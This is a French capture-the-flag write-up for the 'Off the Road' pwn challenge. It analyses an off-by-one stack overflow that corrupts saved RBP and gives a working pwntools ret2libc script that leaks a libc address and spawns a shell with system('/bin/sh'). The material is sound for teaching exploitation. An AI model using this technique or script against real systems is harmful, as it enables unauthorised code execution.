## PWN / Off the Road

<p align="center">
  <img src="img/consignes.png" />
</p>

### Fichiers

- binaire : [off-the-road](off-the-road)
- libc : [libc-2.27.so](libc-2.27.so)

### Analyse

```bash
$ file off-the-road
off-the-road: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a36c432bd8216f703e1205989b4a393596bf8c15, for GNU/Linux 3.2.0, not stripped

$ checksec --file=off-the-road
RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX enabled    No PIE
```

En décompilant le binaire, on regarde le code, `main` ne fait rien de particulier :

```c
void main(void)

{
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  puts("Good luck ;)");
  getInput();
  return;
}
```

```c
void getInput(void)

{
 ...
  fread(&local_108,1,0x101,stdin);
  return;
}
```

En revanche, la fonction récupérant l'entrée utilisateur lit 0x101 octets pour un buffer pouvant en contenir 0x100.

Nous allons donc déborder de 1 octet sur la stack-frame de `getInput()`.

La stack-frame est de la sorte :

```
buffer      <= $rsp
buffer
....
buffer
buffer
saved RBP   <= $rbp
saved RIP
```

Donc si on déborde de 1 octet de buffer, on va écraser l'octet de poids faible de `saved_rbp`, et en sortant quittant la fonction `getInput()`, l'épilogue sera modifié : https://www.esaracco.fr/documentation/assembly/assembly/les-fonctions.html

Dans GDB :

```
gdb-peda$ x/50gx $rsp
0x7fffffffdeb0:	0x4141414141414141	0x4141414141414141
0x7fffffffdec0:	0x4141414141414141	0x4141414141414141
0x7fffffffded0:	0x4141414141414141	0x4141414141414141
0x7fffffffdee0:	0x4141414141414141	0x4141414141414141
0x7fffffffdef0:	0x4141414141414141	0x4141414141414141
0x7fffffffdf00:	0x4141414141414141	0x4141414141414141
0x7fffffffdf10:	0x4141414141414141	0x4141414141414141
0x7fffffffdf20:	0x4141414141414141	0x4141414141414141
0x7fffffffdf30:	0x4141414141414141	0x4141414141414141
0x7fffffffdf40:	0x4141414141414141	0x4141414141414141
0x7fffffffdf50:	0x4141414141414141	0x4141414141414141
0x7fffffffdf60:	0x4141414141414141	0x4141414141414141
0x7fffffffdf70:	0x4141414141414141	0x4141414141414141
0x7fffffffdf80:	0x4141414141414141	0x4141414141414141
0x7fffffffdf90:	0x4141414141414141	0x4141414141414141
0x7fffffffdfa0:	0x4141414141414141	0x4141414141414141
0x7fffffffdfb0:	0x00007fffffffdf41	0x0000000000401340  <= saved_rbp modifié : 0x00007fffffffdf41
```

Les dernières instructions des fonctions sont `LEAVE RET`, ce qui correspond à :

```
mov rsp, rbp  <= rapporte le somment de pile au bas de la pile
pop rbp       <= met saved_rbp dans rbp
pop rip       <= met saved_rip dans rip
```


En quittant `getInput` on va retourner dans le `main` à l'épilogue de `main`, mais avec `$rbp = 0x00007fffffffdf41`

A nouveau l'épilogue de `main` se déroule, sauf que RBP modifié pointe dans dans notre input, et le programme va charger la valeur suivante dans RIP pour quitter `main`.

On contrôle donc un peu le flow d'exécution du programme.



### Exploit

En terminant notre input par `0x00` on va modifier le saved_rbp en `0x00007fffffffdf00` pour pointer proprement dans notre payload.

L'idée en suite est un ret2libc classique :
- leaker une adresse de la libc en appelant : `puts(puts@GOT)`
- rappeler `getInput` pour un deuxième payload
- effectuer un `system("/bin/sh")`

Faut tester un peu le rappel de `getInput`, pour se retrouver dans une situation où le saved_rbp modifié pointe assez haut dans notre payload.

Du coup je rappelle l'adresse `0x40117b` qui correspond à `0040117e 48 81 ec SUB RSP,0x100` et non directement sur le prologue de `getInput`


Par ailleurs, l'appel à système pose quelques soucis d'alignement de la stack, normalement je le précède d'un `ret`, mais là ça ne changeait rien.

Je pouvais faire un `puts(&/bin/sh)` qui m'affichait bien "/bin/sh" après le 2e payload, confirmant qu'il fonctionne.

Du coup de façon artificielle j'ai un peu bourré la stack avec du junk.

Par ailleurs pour être sûr de taper dans le payload, le padding est des `ret`

- code : [off-the-road.py](off-the-road.py)

```python
payload = b""
payload += p64(ret) * (32 - 4)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(get_input)
payload += b"\x00"

r = conn()

rep = r.recvuntil(b'Good luck ;)\n')
print(rep)

r.send(payload)

rep = r.recv()

leak = rep.split(b"\n")[0].strip().ljust(8,b'\x00')
log.success("Leak puts@libc : " + hex(u64(leak)))

offset = u64(leak) - puts_libc
sys = offset + sys_libc
bin_sh = offset + bin_sh_libc

payload2 = b""
payload2 += p64(ret) * (32-5)
payload2 += b"CCCCCCCC"
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(sys)
payload2 += b"CCCCCCCC"  # try some stuffs for stack alignement needed by sys
payload2 += b"\x08"

r.send(payload2)
```
